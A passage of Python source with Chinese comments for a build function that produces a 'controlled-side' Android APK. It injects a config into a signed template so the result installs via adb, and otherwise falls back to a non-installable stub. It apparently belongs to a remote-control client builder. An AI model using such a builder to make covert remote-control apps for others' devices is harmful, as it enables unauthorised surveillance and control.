            'dex_bytes': len(dex_bytes), 'axml_bytes': len(manifest),
            'config': inject_cfg, 'package': _package_of(manifest),
            'stub': False, 'signed': True, 'template': os.path.basename(template),
            'signature': signature_note}


def build_apk(cfg, out_path, icon_path=None, on_stage=None):
    """构建被控端 APK。

    有真模板 → 模板注入（真 dex + 真签名，体积 ~9 MB，可 adb install）；
    没有模板 → 退回占位包（stub=True，~3 KB，装不上，只用于结构演示）。

    返回 dict：path / size / sha256 / stages / dex_bytes / axml_bytes / package /
               stub / signed / template / signature
    """
    stages = []

    def stage(i):
        stages.append({'stage': STAGES[i], 'ts': int(time.time() * 1000)})
        if on_stage:
            on_stage(i, STAGES[i])

    stage.stages = stages                     # 让 _build_from_template 回传同一份进度

    template = find_template(cfg)
    if template:
        ver = str(cfg.get('appversion') or cfg.get('apkVersion') or '').strip().lstrip('vV')
        versioned = bool(ver) and os.path.basename(template).lower() in (
            ('v%s.apk' % ver).lower(), ('%s.apk' % ver).lower())
        try:
            res = _build_from_template(cfg, out_path, icon_path, template, stage)
            res['template_versioned'] = versioned
            res['template_fallback'] = bool(ver) and not versioned
            return res
        except Exception as exc:              # 模板坏了不该让整条构建链停摆
            res = _build_stub_apk(cfg, out_path, icon_path, on_stage)
            res['template'] = os.path.basename(template)
            res['template_error'] = str(exc)[:300]
            return res
    return _build_stub_apk(cfg, out_path, icon_path, on_stage)
